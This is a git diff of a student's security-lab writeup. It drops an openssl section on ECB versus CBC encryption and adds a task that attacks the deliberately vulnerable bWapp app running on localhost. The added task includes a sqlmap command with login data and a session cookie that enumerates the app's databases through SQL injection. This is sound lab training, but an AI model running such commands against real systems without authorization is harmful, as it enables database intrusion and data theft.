@@ -62,39 +62,25 @@ set *0xffffd728 = 0xffffd720
 
 
 
-# Task 2. Encryption Mode – ECB vs. CBC
-This lab compares the behaviour of ECB and CBC encryption modes
-**Question 1**: Exploration of various ECB & CBC  with openssl
+# Task 2. Attack on the database of bWapp
+- Install bWapp (refer to quang-ute/Security-labs/Web-security). 
+- Install sqlmap.
+- Write instructions and screenshots in the answer sections. Strictly follow the below structure for your writeup.
+**Question 1**: Use sqlmap to get information about all available databases
 **Answer 1**:
-## 1. Download the bitmap file `origin.bmp`.
-
-
-## 2. Split the file into header and body:
-
+## 1. Install sqlmap.
 ```sh
-dd if=origin.bmp of=header.bin bs=1 count=54
-dd if=origin.bmp of=body.bin bs=1 skip=54
+git clone https://github.com/sqlmapproject/sqlmap.git
 ```
-
-<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage7.png?raw=true"><br>
-
-
-## 3. Encrypt the body using CBC mode:
-
-<span>*I reused the KEY and IV values from the first task, just to make sure the consistency.*</span><br>
-
+Get database from bWapp
+-u "http://localhost:8025/portal.php?id=1": This specifies the target URL where SQL injection can be tested. Make sure to modify the URL parameter if necessary.
+--dbs: This option tells sqlmap to enumerate the databases on the target server.
 ```sh
-openssl enc -aes-256-cbc -nosalt -in body.bin -out encrypted_body.bin -K 00112233445566778899AABBCCDDEEFF00112233445566778899AABBCCDDEEFF -iv 0102030405060708090A0B0C0D0E0F10
+python sqlmap.py -u "http://localhost:8025/portal.php" --data "username=bee&password=bug" --cookie="PHPSESSID=e9jh4k1ilud5lptoj2qc4uiq54; security=0" --dbs
 ```
+<img width="1276" alt="{F3F3B3DE-374A-4EC4-A980-6F650777960E}" src="https://github.com/user-attachments/assets/1dc13cce-7d81-4662-a2f6-88c7302be089">
+<img width="1280" alt="{BA789625-7FBE-4545-B63B-06176EEE808F}" src="https://github.com/user-attachments/assets/07c238b3-031c-4ec1-ae10-0bd47c28e990">
+<img width="1280" alt="{32255D48-C72C-4701-8F22-15DF5CE02193}" src="https://github.com/user-attachments/assets/14c220b5-6a89-4b27-a945-b476ef808169">
 
-<span>*After using the `cat` command to look at the `encrypted_body.bin`, we can see it was fully encrypted.*</span><br>
 
-<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage8.png?raw=true"><br>
 
-## 4. Combine the header and encrypted body:
-
-```sh
-cat header.bin encrypted_body.bin > partially_encrypted.bmp
-```
-
-<img width="500" alt="Screenshot" src="https://github.com/AlexanderSlokov/Security-Labs-Submission/blob/main/asset/encryptingLargeMessage9.png?raw=true"><br>
